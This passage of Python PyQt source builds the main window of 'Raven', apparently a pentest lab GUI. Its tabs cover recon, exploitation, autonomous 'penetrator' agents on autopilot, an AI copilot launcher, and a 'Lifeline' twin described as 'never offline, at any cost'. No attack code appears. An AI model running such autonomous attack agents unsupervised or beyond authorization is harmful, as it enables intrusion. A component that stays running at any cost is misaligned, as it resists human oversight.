        last = gd.get("last") or ""
        fresh = abs(int(time.time()) - int(gd.get("ts") or 0)) < 60
        if mode == "off":
            gtxt = "BIG BROTHER ▸ DISARMED — eyes closed, everyone welcome"
            gcol = SEV_INFO
        elif acts and fresh:
            gtxt = f"BIG BROTHER ▸ JUST ACTED {acts}× {last}"
            gcol = SEV_CRIT
        elif acts:
            gtxt = f"BIG BROTHER ▸ ON — {acts} act(s) this session. last: {last}"
            gcol = SEV_HIGH
        else:
            gtxt = "BIG BROTHER ▸ ON — sensing the room, nothing to wave away"
            gcol = SEV_LOW
        self.guard_banner.setText(gtxt)
        self.guard_banner.setStyleSheet(
            f"color: {gcol}; font-size: 13px; font-weight: bold; letter-spacing: 2px; "
            f"border: 1px dashed {gcol}; padding: 6px 10px; background: #06080c;"
        )

    def _tail(self):
        try:
            n = LEDGER_PATH.stat().st_size
            if n > self._offset:
                with open(LEDGER_PATH, "rb") as f:
                    f.seek(self._offset)
                    chunk = f.read(n - self._offset).decode("utf-8", "replace")
                self._offset = n
                if chunk.strip():
                    self.events.appendPlainText(chunk.rstrip("\n"))
                    self.log("twin: " + chunk.strip().replace("\n", " | "))
                if self.events.document().blockCount() > 600:
                    self.events.clear()
                    self._offset = 0
        except OSError:
            pass


class Raven(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Raven")
        icon = Path(__file__).parent / "assets" / "raven_neon.png"
        if icon.exists():
            self.setWindowIcon(QIcon(str(icon)))
        self.resize(1100, 720)
        self.setMinimumSize(760, 520)

        root = QWidget()
        root.setObjectName("root")
        lay = QVBoxLayout(root)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(0)

        header = QFrame()
        header.setObjectName("header")
        hl = QHBoxLayout(header)
        hl.setContentsMargins(24, 16, 24, 16)
        title_box = QVBoxLayout()
        title_box.setSpacing(0)
        t = QLabel("RAVEN")
        t.setObjectName("title")
        title_box.addWidget(t)
        sub = QLabel("SECURITY LAB // LOCAL AUTHORIZED TESTING ONLY")
        sub.setObjectName("sub")
        title_box.addWidget(sub)
        hl.addLayout(title_box)
        hl.addStretch(1)
        mode = QLabel("OFFLINE")
        mode.setStyleSheet(
            f"color: {NEON}; border: 1px solid {NEON}; padding: 4px 12px; "
            f"font-size: 11px; letter-spacing: 2px;"
        )
        hl.addWidget(mode)
        lay.addWidget(header)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.log_view = QPlainTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setPlaceholderText("stdout / stderr appears here")
        self.build_tabs()
        lay.addWidget(self.tabs, 1)

        self.setCentralWidget(root)
        self.statusBar().showMessage("Ready — only run against devices you own or have permission to test.")

    def build_tabs(self):
        # Dashboard
        dash = Panel("DASHBOARD", "system overview")
        dash.add(placeholder("No data yet.\nModules will report here."))
        self.tabs.addTab(dash, "Dashboard")

        # Recon
        recon = Panel("RECON", "enumerate and fingerprint the target")
        self.recon = ReconPane(self.log, self.report)
        recon.add(self.recon)
        self.tabs.addTab(recon, "Recon")

        # Birdshit — pentest study
        bird = Panel("BIRDSHIT", "penetration study // exploitation and post-exploitation")
        self.bird = ReconPane(self.log, self.report, tools=PENTEST_TOOLS, tag="birdshit")
        bird.add(self.bird)
        self.tabs.addTab(bird, "Birdshit")

        # Learn — A-Z curriculum
        learn = Panel("LEARN", "a-z modules // commands, expectations, deep-dive analysis")
        self.learn = LearnPane(self.log, self.report)
        learn.add(self.learn)
        self.tabs.addTab(learn, "Learn")

        # Crow — autonomous agents
        crow = Panel("CROW", "spawn an agent // recon or penetrator on autopilot")
        self.crow = CrowPane(self.log, self.report)
        crow_scroll = QScrollArea()
        crow_scroll.setWidgetResizable(True)
        crow_scroll.setFrameShape(QFrame.Shape.NoFrame)
        crow_scroll.setStyleSheet("QScrollArea { background: transparent; border: none; }")
        crow_scroll.setWidget(self.crow)
        crow.add(crow_scroll)
        self.tabs.addTab(crow, "Crow")

        # Lifeline — the unconscious twin (was: Scan)
        lifeline = Panel("LIFELINE", "unconscious twin // never offline, at any cost")
        self.lifeline = LifelinePane(self.log)
        lifeline.add(self.lifeline)
        self.tabs.addTab(lifeline, "Lifeline")

        # Modules
        mods = Panel("MODULES", "pluggable tools")
        mods.add(placeholder("Modules land here."))
        self.tabs.addTab(mods, "Modules")

        # OPENCODE
        oc = Panel("OPENCODE", "ai copilot // cybersecurity training")
        self.oc_status = QLabel()
        self.oc_status.setStyleSheet(f"color: {MUTED}; font-size: 13px;")
        oc.add(self.oc_status)

        row = QHBoxLayout()
        row.setSpacing(12)
        self.btn_launch = QPushButton("LAUNCH OPENCODE")
        self.btn_launch.clicked.connect(self.launch_opencode)
        row.addWidget(self.btn_launch)
        self.btn_web = QPushButton("OPEN WEB UI")
        self.btn_web.setObjectName("ghost")
        self.btn_web.clicked.connect(self.launch_web)
        row.addWidget(self.btn_web)
        row.addStretch(1)
        oc.body.addLayout(row)

        oc.add(placeholder(
            "Ask it anything about security — concepts, walkthroughs, code review.\n"
            "Only against devices you own or have written permission to test.\n\n"
            "More AI providers plug in here later."
        ))
        self.tabs.addTab(oc, "OpenCode")
        self.refresh_provider()

        # Logs
        logs = Panel("LOGS", "raw output")
        logs.add(self.log_view)
        self.tabs.addTab(logs, "Logs")

        # Settings
        settings = Panel("SETTINGS", "configuration")
        settings.add(placeholder("Settings land here."))
        self.tabs.addTab(settings, "Settings")

    def refresh_provider(self):
        ver = opencode_version()
        term, _ = find_terminal()
        if ver is None:
            self.oc_status.setText("opencode: NOT FOUND — install it to enable this tab")
            self.btn_launch.setEnabled(False)
            return
        mode = f"terminal: {term}" if term else "terminal: none (falls back to web UI)"
        self.oc_status.setText(f"opencode {ver}  //  {mode}  //  status: READY")
        self.btn_launch.setEnabled(True)

    def launch_opencode(self):
        term, argv = find_terminal()
        if term:
            ok = QProcess.startDetached(argv[0], argv[1:], str(ROOT))
            msg = f"launched opencode in {term}" if ok else f"failed to launch {term}"
        else:
            ok = QProcess.startDetached("opencode", ["web"], str(ROOT))
            msg = "no terminal found — opened opencode web UI" if ok else "failed to launch opencode"
        self.statusBar().showMessage(msg)
        self.log(f"[opencode] {msg}")

    def launch_web(self):
        ok = QProcess.startDetached("opencode", ["web"], str(ROOT))
        msg = "opened opencode web UI" if ok else "failed to launch opencode web"
        self.statusBar().showMessage(msg)
        self.log(f"[opencode] {msg}")

    def log(self, text):
        self.log_view.appendPlainText(text)

    def report(self, msg):
        self.statusBar().showMessage(msg)
        self.log(f"[raven] {msg}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setStyleSheet(STYLE)
    app.setFont(QFont("monospace", 10))
    raven = Raven()
    raven.show()
    sys.exit(app.exec())
